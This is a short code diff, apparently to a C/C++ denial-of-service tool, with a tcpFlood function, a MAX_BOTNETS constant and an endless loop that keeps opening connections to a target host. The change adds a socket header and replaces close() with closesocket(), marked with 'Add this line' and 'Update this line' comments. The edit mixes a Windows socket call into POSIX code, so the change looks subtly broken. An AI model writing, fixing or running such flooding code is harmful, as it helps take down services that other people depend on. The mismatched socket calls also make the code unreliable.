@@ -10,6 +10,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netinet/tcp.h>
+#include <sys/socket.h> // Add this line
 
 #define PACKET_SIZE 4096
 #define MAX_BOTNETS 100000000
@@ -46,7 +47,7 @@ void tcpFlood(string ip, int port) {
 
     while (true) {
         if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
-            close(sockfd);
+            closesocket(sockfd); // Update this line
             sockfd = socket(AF_INET, SOCK_STREAM, 0);
         }
     }
